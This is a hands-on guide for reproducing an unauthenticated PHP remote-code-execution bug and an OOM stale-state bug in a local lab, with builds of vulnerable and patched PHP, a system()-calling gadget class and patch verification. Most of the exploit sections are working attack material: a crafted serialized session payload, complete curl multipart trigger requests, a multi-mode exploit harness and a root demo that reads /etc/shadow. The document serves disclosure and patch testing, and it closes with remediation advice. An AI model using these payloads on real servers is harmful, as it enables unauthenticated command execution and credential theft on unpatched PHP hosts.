# Manual testing guide — CVE-2026-109618 / CVE-2026-109619 (PHP RCE)

Copyright 2026 Joshua Rosato.

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

Author: Joshua Rosato.

This guide walks you through reproducing the PoC end to end on your own
machine: building the **vulnerable** and the **patched** PHP 8.5, standing up
a lab, triggering the exploit by hand, and proving that the upstream patch
blocks it.

Everything below was executed on this host; the outputs shown are real.

---

## TL;DR — fastest path (lab already built on this machine)

```bash
cd /path/to/repo

# 1. start the vulnerable PHP 8.5 lab and fire the PoC
./lab/run_lab.sh 9032

# 2. differential test: vulnerable vs patched
./lab/verify_patched.sh

# 3. root-impact demo (asks for your password via pkexec)
./lab/run_root_lab.sh
```

If the lab is not built yet: `./lab/build_vuln_php.sh && ./lab/build_gadget.sh`
first (steps 2–4 below). Everything is explained step by step further down.

**Files you will use**

| Path | What it is |
|---|---|
| `GUIDE.md` | this guide |
| `README.md` | technical write-up (root cause, patch analysis, verification) |
| `poc_rce.py` | consolidated best-version RCE harness: four variants (session-poisoning, handler-mismatch, include-sink, memory-corrupt) + differential verification |
| `poc.py` | OOM trigger + stale-state driver (FPM and HTTP) |
| `poc_stale_state.py` | producer/consumer sequence proving the dangling pointer |
| `poc_heap_spray.py` | heap-grooming variant |
| `fcgi_client.py` | minimal FastCGI client |
| `symextract.py` | ELF64 `.dynsym` reader — extracts `zval_ptr_dtor` / `zend_call_function` + per-build delta from the PHP binary |
| `lab/` | build scripts, lab web root, php.ini, gdb script, gadget extension source |

---

## 0. What you are testing

| CVE | Advisory | What happens |
|---|---|---|
| CVE-2026-109618 | GHSA-w8hw-w9fx-j79w | PHP used `bailout()` (longjmp) on OOM. An OOM during request parsing escaped contexts that did not account for the early exit, leaving invalid request state that the shutdown path then consumed. |
| CVE-2026-109619 | GHSA-6wmf-4rv5-p3rp | Request-owned state kept in worker globals (`BG(unserialize)`, `EG(last_fatal_error_backtrace)`, session state) survived the request that owned it. The **session upload-progress handler** consumes that stale state *before* RINIT, i.e. before any application code runs. |

The upstream fix is php-src commit `3584a98b` *"Avoid state corruption via
bailout"* (merged into `PHP-8.3` / `PHP-8.4` / `PHP-8.5`).

**Observable proof of CVE-2026-109619 (RCE):** the session upload-progress
handler unserialises the session during request startup. Before the fix that
unserialiser may instantiate objects and run their `__wakeup()`. A single
unauthenticated multipart request therefore yields command execution as the
web worker.

---

## 1. Prerequisites

```bash
# build tools + re2c (needed by PHP's configure)
pkexec pacman -S --needed base-devel re2c

# optional: container runtime for the mod_php / isolated-root labs
sudo pacman -S --needed podman

# optional: for the gdb session (ptrace)
pkexec sh -c 'echo 0 > /proc/sys/kernel/yama/ptrace_scope'
```

Disk: ~1 GB per PHP build tree, ~4 GB for two trees plus objects.

---

## 2. Build the vulnerable PHP 8.5

```bash
cd /path/to/repo
./lab/build_vuln_php.sh
```

What it does (and what you can do by hand):

```bash
git clone --filter=blob:none https://github.com/php/php-src.git /tmp/php-src
cd /tmp/php-src
git fetch --depth 20 origin PHP-8.5:PHP-8.5
git checkout -B vuln-85 73e2bad9        # PHP-8.5, the commit right before the fix
./buildconf --force
./configure --enable-debug --enable-fpm --with-mysqli --prefix=/tmp/php-vuln85
```

**Gotcha:** PHP ≥ 8.5 exports a `ZEND_VM_KIND` constant, which breaks
`zend_vm_gen.php` (`Undefined array key "ZEND_VM_KIND_HYBRID"`, and the
generated header ends up with an empty `#define ZEND_VM_KIND`). Generate the
VM sources with an older PHP instead:

```bash
podman run --rm -v /tmp/php-src:/src -w /src/Zend \
  docker.io/library/php:8.3-cli php zend_vm_gen.php --with-vm-kind=HYBRID
```

Then:

```bash
make -j"$(nproc)" && make install
/tmp/php-vuln85/bin/php -v      # PHP 8.5.13-dev (NTS DEBUG)
```

`--enable-debug` matters: the Zend MM debug allocator reports the
stale-state corruption, which is how we prove the use-after-free.

---

## 3. Build the patched PHP 8.5 (for the differential test)

```bash
cd /tmp
cp -a php-src php-src-patched
cd php-src-patched
git checkout -B patched-85 c7273b9b     # PHP-8.5 tip, contains the fix
./buildconf --force
./configure --enable-debug --enable-fpm --with-mysqli --prefix=/tmp/php-patched
podman run --rm -v "$PWD":/src -w /src/Zend docker.io/library/php:8.3-cli \
  php zend_vm_gen.php --with-vm-kind=HYBRID
make -j"$(nproc)" && make install
/tmp/php-patched/bin/php -v
```

Sanity check that the fix is really in the tree:

```bash
grep -n "php_var_unserialize_set_incomplete_classes_only" \
  /tmp/php-src-patched/ext/session/session.c
grep -n "php_basic_early_rinit" /tmp/php-src-patched/main/main.c
```

---

## 4. Build the "gadget" extension

The exploit needs a class whose `__wakeup()` does something dangerous. Real
deployments expose such classes through frameworks/extensions; the lab uses a
20-line test extension so the PoC is self-contained.

```bash
cd /path/to/repo
./lab/build_gadget.sh
# -> /tmp/ext-pwn/modules/pwn.so
```

`lab/gadget/pwn.c` is the source. It registers class `Pwn` with a `cmd`
property; `__wakeup()` calls `system()` with that value.

---

## 5. Start the lab

### 5a. PHP built-in server (simplest)

```bash
cd /path/to/repo
./lab/run_lab.sh 9032
```

That script:

* creates `/tmp/poc-lab/www` and `/tmp/poc-lab/sessions`,
* starts `/tmp/php-vuln85/bin/php -d extension=…/pwn.so -S 127.0.0.1:9032 -t /tmp/poc-lab/www -c /tmp/poc-lab/lab.ini`,
* runs the PoC.

Relevant `lab/lab.ini` settings:

```ini
memory_limit = 8M
session.upload_progress.enabled = 1      ; default in PHP
session.use_strict_mode = 0              ; accept a made-up session id
session.save_path = /tmp/poc-lab/sessions
fatal_error_backtraces = 1               ; default in PHP 8.5
```

### 5b. By hand (so you can watch everything)

```bash
mkdir -p /tmp/poc-lab/www /tmp/poc-lab/sessions
cp /path/to/repo/lab/{index.php,consumer.php,producer.php} /tmp/poc-lab/www/
sed -e "s#/tmp/asanlab/sessions#/tmp/poc-lab/sessions#" \
    /path/to/repo/lab/lab.ini > /tmp/poc-lab/lab.ini

/tmp/php-vuln85/bin/php \
    -d extension=/tmp/ext-pwn/modules/pwn.so \
    -S 127.0.0.1:9032 -t /tmp/poc-lab/www -c /tmp/poc-lab/lab.ini
```

In another terminal:

```bash
curl -s http://127.0.0.1:9032/index.php      # -> hello
```

---

## 6. Run the exploit by hand

### Step 1 — put the payload into the session store

The attacker capability: any endpoint that stores user input in `$_SESSION`.
The PHP `php` session serializer writes `name|serialized-value`:

```bash
SID=abcdef0123456789abcdef0123456789
CMD='id>/tmp/poc-lab/whoami.txt'
printf 'evil|O:3:"Pwn":1:{s:3:"cmd";s:%d:"%s";}' ${#CMD} "$CMD" \
    > /tmp/poc-lab/sessions/sess_$SID
cat /tmp/poc-lab/sessions/sess_$SID
# evil|O:3:"Pwn":1:{s:3:"cmd";s:26:"id>/tmp/poc-lab/whoami.txt";}
```

> The declared string length **must** match the payload exactly, otherwise PHP
> answers `Failed to decode session object. Session has been destroyed`.

### Step 2 — send the trigger request (one multipart POST)

```bash
curl -s -X POST "http://127.0.0.1:9032/consumer.php" \
  -H 'Content-Type: multipart/form-data; boundary=----B' \
  --data-binary $'------B\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\nabcdef0123456789abcdef0123456789\r\n------B\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n------B\r\nContent-Disposition: form-data; name="f"; filename="f.txt"\r\nContent-Type: text/plain\r\n\r\nx\r\n------B--\r\n'
```

Expected output:

```
Notice: PHP Request Startup: Pwn::__wakeup() is executing the command in Unknown on line 0
SESSION: {"evil":{"cmd":"id>\/tmp\/poc-lab\/whoami.txt"}}
```

Note the wording: **“PHP Request Startup”** — the code ran during request
startup, *before* the application script.

### Step 3 — check the result

```bash
cat /tmp/poc-lab/whoami.txt
# uid=1000(joshua) gid=1000(joshua) groups=1000(joshua),998(wheel)
```

### Running the consolidated harness instead of hand-built curl

The packaged `poc_rce.py` now implements four exploitation variants plus a
differential verification mode. The default (`session-poisoning`) is the one
reproduced in the lab and is equivalent to the curl sequence above.

```bash
cd /path/to/repo
python3 poc_rce.py --url http://127.0.0.1:9032/ \
    --sid abcdef0123456789abcdef0123456789 \
    --session-path /tmp/poc-lab/sessions/sess_abcdef0123456789abcdef0123456789
```

Other variants available through `--mode`:

```bash
# Handler-mismatch (two .user.ini handlers sharing one session dir):
python3 poc_rce.py --url http://127.0.0.1:9066/ \
    --sid abcdef0123456789abcdef0123456789 \
    --mode mismatch --write-endpoint /app/seed.php --read-endpoint /api/trigger.php

# Include-sink (gadget-class-free; session value fed to an include/eval sink):
python3 poc_rce.py --url http://127.0.0.1:9032/ \
    --sid abcdef0123456789abcdef0123456789 \
    --mode include --sink /var/www/html/inc/render.php

# Memory-corrupt / CVE-2026-109618 (needs a leaked zend_call_function address):
python3 symextract.py --binary /tmp/php-vuln85/sbin/php-fpm
python3 poc_rce.py --url http://127.0.0.1:9032/ \
    --sid abcdef0123456789abcdef0123456789 \
    --mode corrupt --call 0x<runtime_zend_call_function> --cmd 'id'
```

Differential verification (same flow against the patched build):

```bash
python3 poc_rce.py --url http://127.0.0.1:9042/ \
    --sid abcdef0123456789abcdef0123456789 --verify-patch
```

---

## 7. Prove the patch blocks it

```bash
cd /path/to/repo
./lab/verify_patched.sh
```

Output:

```
=== VULNERABLE (8.5.13-dev) ===
    Notice: PHP Request Startup: Pwn::__wakeup() is executing the command in Unknown on line 0
    RESULT: command executed -> uid=1000(joshua) gid=1000(joshua) groups=1000(joshua),998(wheel)

=== PATCHED (8.5.13-dev) ===
    SESSION: null
    RESULT: no command execution
```

The patched build turns the object into `__PHP_Incomplete_Class` and never
calls `__wakeup()`.

---

## 8. Root-impact demo (when the worker runs as root)

The exploit runs with exactly the web worker's privileges. When that worker is
root, you get root.

```bash
cd /path/to/repo
./lab/run_root_lab.sh          # pkexec will ask for your password
```

```
=== /root/poc_rce_proof.txt (written by the exploit, as root) ===
uid=0(root) gid=0(root) groups=0(root)
-rw------- 1 root root  780 poc_rce_shadow.txt      <-- copy of /etc/shadow

=== /etc/shadow read by the exploit ===
root:<hash redacted>
bin:<hash redacted>
...
shadow copy: /root/poc_rce_shadow.txt  780 bytes  owner root:root  mode 600
```

Set `SHOW_FULL=1` to print the shadow file verbatim. Clean up afterwards:

```bash
pkexec rm -f /root/poc_rce_proof.txt /root/poc_rce_shadow.txt
```

### Isolated alternative (no impact on the host)

```bash
mkdir -p /tmp/poc-rootlab/sessions
cp /path/to/repo/lab/gadget/* /tmp/poc-rootlab/
cp /path/to/repo/lab/{index.php,consumer.php,producer.php} /tmp/poc-rootlab/
sed -e "s#/tmp/asanlab/sessions#/sessions#" /path/to/repo/lab/lab.ini > /tmp/poc-rootlab/lab.ini

# build the gadget against the container's PHP
podman run --rm -v /tmp/poc-rootlab:/src -w /src docker.io/library/php:8.5.7-cli \
  bash -lc 'phpize >/dev/null && ./configure --with-php-config=/usr/local/bin/php-config >/dev/null \
            && make -j4 >/dev/null 2>&1 && cp modules/pwn.so /src/pwn.so'

podman run -d --name poc-root -p 9033:8080 \
  -v /tmp/poc-rootlab:/lab:Z -v /tmp/poc-rootlab/sessions:/sessions:Z \
  docker.io/library/php:8.5.7-cli \
  bash -lc 'php -d extension=/lab/pwn.so -S 0.0.0.0:8080 -t /lab -c /lab/lab.ini'
```

Then run the same `poc_rce.py` against `http://127.0.0.1:9033/`.

---

## 9. mod_php (Apache) — the highest-risk SAPI

The advisory ranks mod_php highest because the attack fires before any
application code.

```bash
mkdir -p /tmp/modphp-lab/sessions /tmp/modphp-lab/conf.d
cp /path/to/repo/lab/gadget/* /tmp/modphp-lab/
cp /path/to/repo/lab/{index.php,consumer.php,producer.php} /tmp/modphp-lab/
printf 'extension=/var/www/html/pwn.so\n' > /tmp/modphp-lab/conf.d/99-pwn.ini
printf 'session.upload_progress.enabled=1\nsession.use_strict_mode=0\nsession.save_path=/var/www/html/sessions\nerror_reporting=E_ALL\ndisplay_errors=On\n' \
  > /tmp/modphp-lab/conf.d/99-session.ini

# build the gadget against the image's PHP
podman run --rm -v /tmp/modphp-lab:/src -w /src docker.io/library/php:8.5.7-apache \
  bash -lc 'phpize >/dev/null && ./configure --with-php-config=/usr/local/bin/php-config >/dev/null \
            && make -j4 >/dev/null 2>&1 && cp modules/pwn.so /src/pwn.so'

podman run -d --name php-poc-modphp2 -p 8081:80 \
  -v /tmp/modphp-lab:/var/www/html:Z \
  -v /tmp/modphp-lab/conf.d:/usr/local/etc/php/conf.d:ro,Z \
  docker.io/library/php:8.5.7-apache
```

Trigger it (note the session file must be readable by the Apache worker,
`www-data`):

```bash
SID=abcdef0123456789abcdef0123456789
CMD='id>/tmp/modphp_poc.txt'
printf 'evil|O:3:"Pwn":1:{s:3:"cmd";s:%d:"%s";}' ${#CMD} "$CMD" > /tmp/modphp-lab/sessions/sess_$SID
chmod 777 /tmp/modphp-lab/sessions && chmod 666 /tmp/modphp-lab/sessions/sess_$SID

curl -s -X POST "http://127.0.0.1:8081/consumer.php" \
  -H 'Content-Type: multipart/form-data; boundary=----B' \
  --data-binary $'------B\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\nabcdef0123456789abcdef0123456789\r\n------B\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n------B\r\nContent-Disposition: form-data; name="f"; filename="f.txt"\r\nContent-Type: text/plain\r\n\r\nx\r\n------B--\r\n'

podman exec php-poc-modphp2 cat /tmp/modphp_poc.txt
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 10. Test the OOM path (CVE-2026-109618)

The OOM trigger needs a worker with a **finite `memory_limit`** — with the
default 128M the request body (bounded by `post_max_size=8M`) is not enough to
exhaust the limit. The lab FPM pool uses 4M:

```bash
cd /path/to/repo
grep memory_limit lab/php.ini lab/fpm.conf

# start the lab FPM (pool: memory_limit=4M, upload progress on)
setsid nohup /usr/bin/php-fpm \
  -y /path/to/repo/lab/fpm.conf -c /path/to/repo/lab/php.ini \
  > /tmp/lab-fpm.log 2>&1 &
sleep 2

python3 poc.py --host 127.0.0.1 --port 9013 --mode oom --count 35000
```

The worker is killed during request startup:

```
[oom] sending 35000 nested fields, body=7513901 bytes, depth=32
[oom] connection lost in 0.15s: [Errno 104] Connection reset by peer
[oom] worker likely killed by OOM during request startup (CVE-2026-109618 condition reached).
```

FPM master log:

```
WARNING: [pool www] child 65950 exited with code 70 after 6.686183 seconds from start
```

HTTP variant (mod_php):

```bash
python3 poc.py --transport http --mode http-oom --url http://127.0.0.1:8080/ --count 35000
```

---

## 11. Test the stale-state path under gdb (CVE-2026-109619)

This is the direct proof of the use-after-free: the consumer request reuses a
pointer that belongs to the *previous* request.

```bash
mkdir -p /tmp/gdblab/www /tmp/gdblab/sessions
cp /path/to/repo/lab/{index.php,consumer.php,producer.php} /tmp/gdblab/www/
sed -e "s#/tmp/asanlab/sessions#/tmp/gdblab/sessions#" \
    /path/to/repo/lab/lab.ini > /tmp/gdblab/lab.ini

cd /path/to/repo
stdbuf -o0 gdb -q -batch -x lab/gdb_stale_state.cmd --args \
  /tmp/php-vuln85/bin/php -S 127.0.0.1:9035 -t /tmp/gdblab/www -c /tmp/gdblab/lab.ini
```

Then, in another terminal:

```bash
# 1. producer: an OOM inside unserialize() skips PHP_VAR_UNSERIALIZE_DESTROY()
curl -s -X POST "http://127.0.0.1:9035/producer.php" \
  -H 'Content-Type: multipart/form-data; boundary=----B' \
  --data-binary $'------B\r\nContent-Disposition: form-data; name="x"\r\n\r\n1\r\n------B--\r\n'

# 2. consumer: the upload-progress handler unserialises before RINIT
curl -s -X POST "http://127.0.0.1:9035/consumer.php" \
  -H 'Content-Type: multipart/form-data; boundary=----B' \
  --data-binary $'------B\r\nContent-Disposition: form-data; name="PHPSESSID"\r\n\r\nabcdef0123456789abcdef0123456789\r\n------B\r\nContent-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\npoc\r\n------B\r\nContent-Disposition: form-data; name="f"; filename="f.txt"\r\nContent-Type: text/plain\r\n\r\nx\r\n------B--\r\n'
```

gdb output:

```
== STALE REUSE: BG(unserialize).data=0x7ffff4e7f000 (level=1)
== DESTROY: level=2 data=0x7ffff4e7f000
```

`level=1` at the start of a request means `php_var_unserialize_init()`
took the “reuse the previous pointer” branch — a use-after-free.

Without gdb, the Zend MM debug allocator in the server log shows the
corruption in the consumer request:

```
ext/standard/var_unserializer.re(168) :  Freeing 0x00007ffff4e68000 (4096 bytes), script=consumer.php
=== Total 1 memory leaks detected ===
```

---

## 12. Troubleshooting

| Symptom | Cause / fix |
|---|---|
| `Failed to decode session object. Session has been destroyed` | The `s:<len>:"..."` length does not match the payload. Regenerate it with `printf '…s:%d:"%s";}' ${#CMD} "$CMD"`. |
| `Failed to write session data (files)` | The session directory is not writable by the worker. `chmod 777` it, or fix `session.save_path`. |
| `Failed to read session data: files` | The session file is not readable by the worker (e.g. written by root, read by `www-data`). `chmod 666` the file. |
| `Pwn::__wakeup()` notice is missing | The gadget extension is not loaded: check `php -d extension=… -r 'var_dump(class_exists("Pwn"));'` → must be `bool(true)`. |
| `Undefined array key "ZEND_VM_KIND_HYBRID"` during the build | Regenerate the VM sources with PHP 8.3 (see step 2). |
| `configure: error: re2c 0.13.4 is required` | `pkexec pacman -S re2c`. |
| `ptrace: Operation not permitted` in gdb | `pkexec sh -c 'echo 0 > /proc/sys/kernel/yama/ptrace_scope'`. |
| gdb `printf` output missing | gdb block-buffers stdout when redirected — run it with `stdbuf -o0`. |
| The exploit works but the command file is missing | The worker’s CWD, not the web root, is the process CWD — use an absolute path in the command. |
| `pkill -f "php -S 127.0.0.1:9032"` kills your own shell | `pkill -f` matches the pattern in your own command line. Use a helper script, or `kill <pid>` from `ss -tlnp`. |

---

## 13. Cleanup

```bash
# stop the lab servers
kill $(cat /tmp/poc-lab/server.pid 2>/dev/null) 2>/dev/null

# containers
podman rm -f php-poc-modphp php-poc-modphp2 poc-root

# artefacts
rm -rf /tmp/poc-lab /tmp/gdblab /tmp/modphp-lab /tmp/poc-rootlab
rm -f /root/poc_rce_proof.txt /root/poc_rce_shadow.txt   # pkexec
rm -f /tmp/poc-lab/whoami.txt /tmp/pwned

# build trees (optional, ~4 GB)
rm -rf /tmp/php-src /tmp/php-src-patched
rm -rf /tmp/php-src-asan /tmp/ext-pwn
rm -rf /tmp/php-vuln85 /tmp/php-patched
```

---

## 14. What to tell the client

1. The vulnerability is **unauthenticated remote code execution** with the
   privileges of the PHP worker.
2. It fires **before application code**, so application-level input validation
   and WAF rules on the application route do not help.
3. The session upload-progress path is the reachable consumer: it
   unserialises the session during request startup.
4. Patching is the only complete fix
   (8.5.12 / 8.4.27 / 8.3.36 / 8.2.35, or a vendor backport).
5. Until patched: `session.upload_progress.enabled=0` and (PHP 8.5)
   `fatal_error_backtraces=0`, applied **administratively and before request
   parsing** — `ini_set()` and `.user.ini` are too late. Restart every worker.
6. Also review every place the application writes user input into
   `$_SESSION`: that is the primitive that turns the startup-time
   unserializer into code execution.
